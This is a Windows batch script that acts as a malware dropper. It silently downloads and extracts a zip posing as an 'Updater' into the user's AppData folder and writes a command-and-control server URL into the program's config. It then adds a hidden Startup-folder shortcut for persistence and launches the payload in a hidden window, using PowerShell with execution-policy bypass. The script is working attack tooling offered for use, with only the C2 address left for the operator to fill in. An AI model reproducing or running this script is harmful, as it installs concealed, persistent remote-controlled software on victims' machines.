@echo off
setlocal

REM ----- WHAT YOU ACTUALLY NEED TO TOUCH -----
set "YOUR_C2_SERVER=https://your-server.com/payload"

REM --- Configuration ---
set "ZIP_URL=https://github.com/elapt1c/erratic/raw/refs/heads/main/launcher/launcher.zip"
set "APP_INSTALL_DIR_NAME=Updater"
set "TEMP_DOWNLOAD_FILE=%TEMP%\updater_download.zip"
set "INSTALL_BASE_DIR=%APPDATA%"
set "APP_FULL_INSTALL_PATH=%INSTALL_BASE_DIR%\%APP_INSTALL_DIR_NAME%"

set "TARGET_EXE_RELATIVE_PATH=launcher\Updater.exe"
set "TARGET_EXE_FULL_PATH=%APP_FULL_INSTALL_PATH%\%TARGET_EXE_RELATIVE_PATH%"
set "CONFIG_FILE_PATH=%APP_FULL_INSTALL_PATH%\launcher\config.txt"

set "SHORTCUT_NAME=Updater.lnk"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT_FULL_PATH=%STARTUP_DIR%\%SHORTCUT_NAME%"

if "%~1"=="MINIMIZED_NOW" goto main_logic

start "" /min "%~f0" MINIMIZED_NOW
exit /b

:main_logic
REM --- 1. Clean & Prepare ---
if exist "%APP_FULL_INSTALL_PATH%" rmdir /s /q "%APP_FULL_INSTALL_PATH%"
mkdir "%APP_FULL_INSTALL_PATH%"
if errorlevel 1 exit /b 1

REM --- 2. Download ---
where curl >nul 2>nul
if %errorlevel% equ 0 (
    curl -L -s -o "%TEMP_DOWNLOAD_FILE%" "%ZIP_URL%"
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference = 'SilentlyContinue'; try { (New-Object System.Net.WebClient).DownloadFile('%ZIP_URL%', '%TEMP_DOWNLOAD_FILE%') } catch { exit 1 }"
)

REM --- 3. Unzip ---
where tar >nul 2>nul
if %errorlevel% equ 0 (
    tar -xf "%TEMP_DOWNLOAD_FILE%" -C "%APP_FULL_INSTALL_PATH%"
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%TEMP_DOWNLOAD_FILE%' -DestinationPath '%APP_FULL_INSTALL_PATH%' -Force"
)

REM --- 4. Config Injection ---
if not exist "%APP_FULL_INSTALL_PATH%\launcher" mkdir "%APP_FULL_INSTALL_PATH%\launcher"
echo %YOUR_C2_SERVER% > "%CONFIG_FILE_PATH%"

REM --- 5. Create Startup Shortcut via PowerShell ---
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$s = (New-Object -ComObject WScript.Shell).CreateShortcut('%SHORTCUT_FULL_PATH%'); ^
     $s.TargetPath = '%TARGET_EXE_FULL_PATH%'; ^
     $s.WorkingDirectory = '%APP_FULL_INSTALL_PATH%\launcher'; ^
     $s.WindowStyle = 7; ^
     $s.Save()"

REM --- 6. The Clean Break Launch ---
REM Start-Process triggers the shortcut and returns immediately. 
REM The 'exit' ensures this CMD window closes before Nuitka can lock it.
del "%TEMP_DOWNLOAD_FILE%" 2>nul

powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%SHORTCUT_FULL_PATH%'"

exit /b 0
